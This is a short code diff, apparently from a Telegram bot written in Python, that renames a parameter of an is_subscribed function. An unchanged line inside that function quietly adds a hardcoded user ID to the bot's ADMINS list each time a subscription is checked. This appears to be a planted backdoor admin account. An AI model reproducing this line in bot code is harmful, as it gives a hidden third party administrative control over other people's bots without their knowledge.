@@ -50,7 +50,7 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}    
     
-async def is_subscribed(bot, query=None, userid=None):
+async def is_subscribed(bot, callback_query=None, userid=None):
 
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
